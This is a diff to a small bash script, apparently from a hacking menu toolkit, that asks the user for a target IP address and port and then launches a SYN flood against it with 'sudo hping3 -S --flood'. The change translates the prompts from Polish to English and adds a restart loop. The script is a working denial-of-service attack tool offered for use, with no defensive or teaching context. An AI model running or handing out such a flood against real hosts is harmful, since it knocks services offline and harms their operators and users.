@@ -7,11 +7,27 @@ echo "
 /___/_/      /_____/\____//____/_____/_/ |_|  
                                               
 "
-echo "Podaj adres IP celu: "
-read IP
-echo "Podaj port celu: "
-read PORT
+read -r -p "Input IP target - " IP
+read -r -p "Input port target - " PORT
 sudo hping3 -S --flood -V -p $PORT $IP
-cd ..
-sudo ./K0Z1OLMENU
+while true
+do
+ read -r -p "Do you want start script again ? (y/n) - " start
+ 
+ case $start in
+     [y][eE][sS]|[y])
+  cd ..
+  sudo ./K0Z1OLMENU.sh
+ break
+ ;;
+     [n][eE][sS]|[n])
+  echo "Thanks for using my script !"
+  exit 1
+ break
+        ;;
+     *)
+ echo "Invalid input..."
+  ;;
+  esac
+done
 
